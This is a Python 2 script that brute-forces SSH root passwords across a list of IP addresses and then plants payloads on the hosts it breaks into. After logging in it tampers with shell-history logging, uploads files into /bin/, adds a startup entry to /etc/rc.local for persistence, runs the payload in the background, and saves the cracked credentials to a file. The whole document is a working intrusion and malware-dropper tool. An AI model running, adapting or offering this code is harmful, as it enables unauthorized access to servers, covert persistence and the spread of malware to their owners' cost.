#!/usr/bin/env python
#author: zengqiu

import sys, os
import threading
import paramiko
from Queue import Queue

queue = Queue(50)
ssh_password = {}

def read_ip(ip_file):
    try:
        with open(ip_file, 'r') as f_ip:
            for line in f_ip:
                queue.put(line.strip())
    except IOError:
        print 'Open ip file failed'

def scan(password_file):
    while not queue.empty():
        ip = queue.get()
        ssh_connect(ip, password_file)
        queue.task_done()	

def ssh_connect(ip, password_file):
    port = 22
    username = 'root'
    timeout = 5
    local_dir = '/root/upload/' 
    remote_dir = '/bin/'
	
    try:
        with open(password_file, 'r') as f_pw:
            for line in f_pw:
                password = line.strip()
                try:
                    client = paramiko.SSHClient()
                    client.load_system_host_keys()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port, username, password, timeout=timeout)
                    print '%s try %s successed' % (ip, password)
					ssh_password[ip] = password
                    
                    client.exec_command('chmod 444 ~/.bash_history')
                    
                    transport = paramiko.Transport((ip, port))
                    transport.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(transport)
					
                    files = os.listdir(local_dir)
                    for upload_file in files:
                        sftp.put(os.path.join(local_dir, upload_file), os.path.join(remote_dir, upload_file))
                        sftp.chmod(os.path.join(remote_dir, upload_file), 7)
                        client.exec_command('echo "test &" >> /etc/rc.local')
                        client.exec_command('/bin/test > /dev/null 2>&1 &')
						#client.exec_command('nohup /bin/test > /dev/null 2>&1 &')

                    transport.close()
                    client.close()
                    break
                except paramiko.AuthenticationException:
                    print '%s try %s failed' % (ip, password)
                    client.close()
                    continue
                except:
                    print '%s try %s failed' % (ip, password)
                    client.close()
                    break
    except IOError:
        print 'Open password file failed'

def create_threads(ip_file, password_file, num_threads):
    threads = []
    ip_reader = threading.Thread(target=read_ip, args=(ip_file,))
    ip_reader.start()
    threads.append(ip_reader)
	
    for i in range(num_threads):
        worker = threading.Thread(target=scan, args=(password_file,))
        worker.start()
        threads.append(worker)
		
    for t in threads:
        t.join()
		
    queue.join()

def main():
    print 'Please ./scan ip_file password_file thread_num'
    create_threads(sys.argv[1], sys.argv[2], int(sys.argv[3]))
    print ssh_password
    ip_pw = open('ip_pw.txt', 'w')
    for key in ssh_password:
        ip_pw.write(key + '\t')
        ip_pw.write(ssh_password[key] + '\n')
    ip_pw.close()

if __name__ == '__main__':
    main()